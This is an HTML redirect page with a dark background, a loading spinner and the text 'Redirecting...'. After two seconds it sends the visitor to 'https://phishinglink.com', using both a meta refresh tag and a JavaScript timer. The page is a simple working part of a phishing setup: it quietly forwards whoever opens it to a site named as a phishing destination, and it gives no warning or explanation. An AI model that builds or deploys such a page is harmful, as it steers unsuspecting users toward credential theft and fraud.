<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>

  <!-- Optional fallback redirect after 2 seconds -->
  <meta http-equiv="refresh" content="2;url=https://phishinglink.com">

  <style>
    body {
      margin: 0;
      height: 100vh;
      display: grid;
      place-items: center;
      font-family: Arial, sans-serif;
      background: #111;
      color: white;
    }

    .box {
      text-align: center;
    }

    .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid #444;
      border-top-color: #fff;
      border-radius: 50%;
      margin: 0 auto 20px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }
  </style>
</head>
<body>
  <div class="box">
    <div class="spinner"></div>
    <h1>Redirecting...</h1>
    <p>You will be redirected in 2 seconds.</p>
  </div>

  <script>
    setTimeout(() => {
      window.location.href = "https://phishinglink.com";
    }, 2000);
  </script>
</body>
</html>
